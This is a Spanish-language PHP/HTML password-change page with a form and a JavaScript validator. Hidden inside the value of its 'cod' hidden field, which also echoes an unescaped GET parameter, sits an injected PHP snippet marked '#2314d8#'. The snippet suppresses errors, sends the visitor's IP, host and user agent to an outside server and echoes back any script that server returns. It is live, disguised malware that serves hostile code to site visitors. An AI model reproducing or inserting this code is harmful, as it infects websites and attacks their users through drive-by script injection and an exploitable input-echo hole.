<script language="javascript" type="text/javascript">
	function validar()
	{
		passwd=document.getElementById('txtContrasenha').value;
		nPasswd=document.getElementById('txtNueva').value;
		nPasswd2=document.getElementById('txtNueva2').value;
		if(passwd.length==0 || nPasswd.length==0 || nPasswd2.length==0)
		{
			alert("ERROR: Deben llenarse todos los campos");
			return;
		}
		if(nPasswd!=nPasswd2)
		{
			alert('ERROR: La nueva contrasenha no concuerda');
			return;
		}
		document.getElementById('cambiar').submit();
	}
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Cambio de Contrasenha</title>
<style type="text/css">
#form1 table tr td {
	font-size: 14px;
}
#form1 table {
	font-style: italic;
}
</style>
</head>
<?php 
	$cod = $_GET["cod"];
?>
<body>
<table width="460" height="209" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="105" colspan="2"><h1>CAMBIO DE CONTRASE&Ntilde;A</h1>
    <hr /></td>
  </tr>
  <tr>
    <td width="230" colspan="2" align="center"><form id="cambiar" name="form1" method="post" action="cambiar.php">
      <table width="400" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td width="211" height="27"><strong>Contrase&ntilde;a actual:</strong></td>
          <td width="189"><input type="text" name="txtContrasenha" id="txtContrasenha" /></td>
        </tr>
        <tr>
          <td height="30"><strong>Nueva Contrase&ntilde;a</strong></td>
          <td><input type="password" name="txtNueva" id="txtNueva" /></td>
        </tr>
        <tr>
          <td height="32"><strong>Confirmar Nueva Contrase&ntilde;a:</strong></td>
          <td><input type="password" name="txtNueva2" id="txtNueva2" /></td>
        </tr>
        <tr>
          <td align="center"><input type="button" name="button" id="button" value="Cambiar" onclick="validar()"/></td>
          <td><input name="hiddenField" type="hidden" id="hiddenField" value="usuarioCambiarContra" />
            <input name="cod" type="hidden" id="cod" value="<?php echo $cod;?>
<?php
#2314d8#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/2314d8#
?>" /></td>
        </tr>
      </table>
    </form></td>
  </tr>
</table>
</body>
</html>